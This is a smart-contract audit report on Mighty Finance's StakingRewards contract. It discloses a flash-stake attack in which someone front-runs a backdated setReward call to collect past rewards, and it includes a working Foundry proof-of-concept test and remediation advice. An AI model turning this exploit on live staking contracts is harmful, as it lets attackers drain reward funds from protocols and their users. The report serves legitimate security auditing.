# Mighty Finance - Findings Report

Prepared by: Nwebor Stephen

Auditors:

- [Stephen](https://github.com/Derastephh)
- [Greg](https://x.com/0xitsgreg)

# Table of contents
<details>

<summary>See table</summary>

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Backdated Rewards Allow Flash-Stake Drainage](#H-01)

</details>
</br>

# <a id='contest-summary'></a>Contest Summary

### Sponsor: Mighty Finance

### Dates: April 15th, 2025 - May 6th, 2025

[See more contest details here](https://cantina.xyz/competitions/616d8bb4-16ce-4ca9-9ce9-5b99d6e146ef)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 6
- Medium: 0
- Low: 2
- Info: 1

</br>


# High Risk Findings

## <a id='H-01'></a>H-01. Backdated Rewards Allow Flash-Stake Drainage

### Summary

The `StakingRewards.sol` logic allows users stake right before a reward period is set and still collect the full rewards for the past time. This makes it possible to flash-stake and drain emissions without actually participating during the intended reward period.

### Finding Description

The owner can set a reward period in the past using `StakingRewards::setReward`:
```solidity
function setReward(address token, uint256 startTime, uint256 endTime, uint256 total)
    external onlyOwner updateReward(address(0))
{
    ...
    if (block.timestamp > startTime && totalStaked > 0) {  // ← back-date branch
        uint256 dt = block.timestamp - startTime;
        rewardData[token].rewardPerTokenStored +=
            (rewardRate * dt * 1e18) / totalStaked; // ← instant reward injection
    }
    ...
}
```
If a user stakes a large amount right before this function runs, they benefit from all the backdated rewards, even though they were not staked during that past time.

Since there’s no lock-up or cooldown, they can stake, claim, and withdraw in quick succession:
```solidity
// StakingRewards::withdrawByLendingPool which is called from LendingPool::unStakeAndWithdraw
balanceOf[user] -= amount;
totalStaked     -= amount;
stakedToken.transfer(to, amount);               // immediate exit, no lock-up

// claim()
updateReward(msg.sender);                       // rewards finalised
transfer(msg.sender, claimable);                // full payout at once
```
This allows a flash loan attack to drain nearly all rewards of a backdated period with just one or two transactions.

### Impact Explanation

An attacker can:

- Watch for `StakingRewards::setReward` transactions in the mempool.
- Stake a large amount right before the transaction confirms.
- Immediately get all the rewards for a past period.
- Withdraw in the next block, keeping most of the rewards.

### Likelihood Explanation

This is very likely to happen when `startTime` is backdated because:

- No special permissions or time limits exist.
- Flash loans make it almost capital free.
- No cooldown prevents it.

### Proof of Code (PoC)

Create a test folder under contracts, then create a `drain.t.sol` file under the test folder and finally paste the below code in the file. Run PoC with the cmd `forge test --mt test_BackdateDrain -vv`

```solidity
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "forge-std/console2.sol";

import "contracts/AddressRegistry.sol";
import "contracts/lendingpool/LendingPool.sol";
import {ExtraInterestBearingToken} from "contracts/lendingpool/ExtraInterestBearingToken.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../interfaces/IWETH9.sol";
import "../VaultRegistry.sol";
import "../shadow/ShadowRangePositionImpl.sol";
import "../interfaces/IShadowRangePositionImpl.sol";
import "../shadow/ShadowRangePositionImpl.sol";
import "../lendingpool/StakingRewards.sol";

contract MockTokens is ERC20 {
    constructor(string memory _name, string memory symbol_) ERC20(_name, symbol_) {}

    function mint(address mintTO, uint256 amount) external {
        _mint(mintTO, amount);
    }
}

contract MockWETH is ERC20("Mock Wrapped Ether", "mWETH"), IWETH9 {
    constructor() {
        _mint(msg.sender, 1_000_000 ether);
    }

    function deposit() external payable override {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external override {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        _burn(msg.sender, amount);
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "ETH transfer failed");
    }

    receive() external payable {}
}

contract LendingPoolTest is Test {
    LendingPool lendingPool;
    AddressRegistry addressRegistry;
    MockTokens underlyingToken;
    MockTokens rewardToken;
    MockTokens stakingToken;
    address treasury;
    address factory;
    address owner;
    address attack;
    address user;
    uint256 reserveId;
    address eTokenAddress;
    VaultRegistry vaultRegistry;
    StakingRewards stakingRewards;

    // address constant WSonic = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;

    MockWETH mockWETH = new MockWETH();
    address WSonic = address(mockWETH);

    function setUp() public {
        owner = makeAddr("owner");
        attack = makeAddr("attack");
        user = makeAddr("user");
        treasury = makeAddr("Treasury");
        factory = makeAddr("Factory");
        vm.startPrank(owner);
        addressRegistry = new AddressRegistry(WSonic);
        addressRegistry.setAddress(AddressId.ADDRESS_ID_TREASURY, treasury);
        vaultRegistry = new VaultRegistry(address(addressRegistry));
        addressRegistry.setAddress(AddressId.ADDRESS_ID_VAULT_FACTORY, address(vaultRegistry));

        lendingPool = new LendingPool();
        lendingPool.initialize(address(addressRegistry), WSonic);
        reserveId = lendingPool.nextReserveId();
        underlyingToken = new MockTokens("UnderlyingToken", "UT");
        rewardToken = new MockTokens("RewardToken", "RT");
        stakingToken = new MockTokens("StakingToken", "ST");
        stakingRewards = new StakingRewards(address(stakingToken));
        lendingPool.initReserve(address(underlyingToken));
        eTokenAddress = lendingPool.getETokenAddress(reserveId);
        vm.stopPrank();
        underlyingToken.mint(eTokenAddress, 100_000 * (10 ** 18));
        underlyingToken.approve(address(lendingPool), 100_000 * (10 ** 18));

        address[2] memory users = [attack, user];
        for (uint256 i = 0; i < users.length; i++) {
            underlyingToken.mint(users[i], 100_000 * (10 ** 18));
            vm.prank(users[i]);
            underlyingToken.approve(address(lendingPool), 100_000 * (10 ** 18));
        }
    }

    function test_BackdateDrain() public {
    uint256 attackerStake = 1000 ether;
    uint256 rewardAmount = 1_000_000 ether;

    vm.warp(10 days);
    uint256 rewardStart = block.timestamp - 7 days; // Backdate reward start
    uint256 rewardEnd = block.timestamp + 7 days;

    // Owner funds reward token
    rewardToken.mint(owner, rewardAmount);
    vm.startPrank(owner);
    rewardToken.approve(address(stakingRewards), rewardAmount);
    vm.stopPrank();

    // Attacker receives enough tokens to flash stake
    stakingToken.mint(user, attackerStake);
    vm.startPrank(user);

    // Simulate attacker monitoring the mempool

    // Attacker stakes right before reward schedule is set (front-run)
    stakingToken.approve(address(stakingRewards), type(uint256).max);
    stakingRewards.stake(attackerStake, user);

    // Owner sets backdated reward startTime
    vm.stopPrank();
    vm.prank(owner);
    stakingRewards.setReward(address(rewardToken), rewardStart, rewardEnd, rewardAmount);

    // Attacker claims rewards asap
    vm.startPrank(user);
    uint256 beforeClaim = rewardToken.balanceOf(user);
    stakingRewards.claim();
    uint256 afterClaim = rewardToken.balanceOf(user);
    uint256 drained = afterClaim - beforeClaim;

    console2.log("Attacker drained: ", drained); // 499,999.999999999999000000

    // Attacker whithdraws full capital
    stakingRewards.withdraw(attackerStake, user);

    vm.stopPrank();
}
}
```

### Recommendation
- Take a snapshot of totalStaked at the actual `startTime` for fair backdated distribution or prevent `StakingRewards::setReward` from using a `startTime` in the past.
- Add cooldowns or minimum stake duration before claiming.